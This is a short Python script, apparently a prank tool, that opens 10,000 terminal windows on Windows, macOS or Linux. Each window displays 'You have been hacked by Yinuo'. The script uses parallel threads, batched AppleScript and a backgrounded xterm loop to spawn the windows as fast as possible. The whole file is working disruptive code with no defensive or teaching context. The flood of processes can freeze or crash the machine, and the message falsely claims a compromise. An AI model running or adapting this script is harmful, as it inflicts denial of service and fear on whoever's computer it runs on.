import concurrent.futures
import os
import platform
import subprocess
import sys

MESSAGE = "You have been hacked by Yinuo"


def fast_spawn_windows(count=10000):
    system = platform.system()

    if system == "Windows":
        # Using concurrency worker threads to fire Windows start commands in parallel
        def spawn_win():
            subprocess.Popen(
                f'start /B cmd /k "title WARNING & echo {MESSAGE}"', shell=True
            )

        with concurrent.futures.ThreadPoolExecutor(
            max_workers=50
        ) as executor:
            executor.map(lambda _: spawn_win(), range(count))

    elif system == "Darwin":  # macOS
        # Creating multiple windows in a single AppleScript call is orders of magnitude faster
        # than calling osascript 10,000 separate times.
        batch_size = 100
        applescript_batch = f"""
        tell application "Terminal"
            repeat {batch_size} times
                do script "echo '{MESSAGE}'"
            end repeat
        end tell
        """

        for _ in range(count // batch_size):
            subprocess.Popen(["osascript", "-e", applescript_batch])

    elif system == "Linux":
        # Launching xterm directly without desktop manager wrapper overhead
        # Using bash multithreading to fire processes
        cmd = f'for i in $(seq 1 {count}); do xterm -e "bash -c \\"echo \'{MESSAGE}\'; exec bash\\"" & done'
        subprocess.Popen(cmd, shell=True)


if __name__ == "__main__":
    fast_spawn_windows(10000)
